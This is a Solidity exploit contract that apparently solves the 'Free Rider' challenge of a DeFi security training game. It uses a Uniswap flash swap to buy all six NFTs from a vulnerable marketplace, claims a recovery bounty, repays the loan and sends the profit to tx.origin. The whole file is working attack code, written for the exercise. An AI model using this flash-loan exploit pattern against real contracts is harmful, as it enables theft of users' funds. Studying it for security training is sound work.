// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./FreeRiderNFTMarketplace.sol";
import "./FreeRiderRecovery.sol";

interface IFlashSwap {
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
}

interface IPair {
    function token0() external returns (address);
    function token1() external returns (address);
}

interface IFactory {
    function getPair(address, address) external returns (address);
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint256 wad) external;
    function transfer(address, uint256) external returns (bool);
    function balanceOf(address) external returns (uint256);
}

contract AttackFreeRider is IFlashSwap, IERC721Receiver {

  IFactory factory;
  FreeRiderNFTMarketplace market;
  FreeRiderRecovery recovery;
  IWETH weth;

  constructor(address _factory, address payable _market, address _recovery, address _weth) {
    factory = IFactory(_factory);
    market = FreeRiderNFTMarketplace(_market);
    recovery = FreeRiderRecovery(_recovery);
    weth = IWETH(_weth);
  }

  function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external override {
    address token0 = IPair(msg.sender).token0(); // fetch the address of token0
    address token1 = IPair(msg.sender).token1(); // fetch the address of token1
    assert(msg.sender == factory.getPair(token0, token1));

    //unwrap weth received
    weth.withdraw(15 ether);

    //buy all nfts
    uint256[] memory nftIds = new uint256[](6);
    for (uint i; i < 6;) {
        nftIds[i] = i;
        unchecked {
            i++;
        }
    }
    market.buyMany{value: 15 ether}(nftIds);

    //send nfts and receive payment
    DamnValuableNFT nft = market.token();
    bytes memory receiver = abi.encode(address(this));
    for (uint i; i < 6;) {
        nft.safeTransferFrom(address(this), address(recovery), i, receiver);
        unchecked {
            i++;
        }
    }

    weth.deposit{value: 15.05 ether}();
    weth.transfer(msg.sender, 15.05 ether);

    (bool success,) = payable(tx.origin).call{value: address(this).balance}("");
    require(success, "cannot send eth");
  }

  function onERC721Received(address, address, uint256, bytes memory) pure external returns (bytes4) {
    return IERC721Receiver.onERC721Received.selector;
  }

  receive() external payable {}
}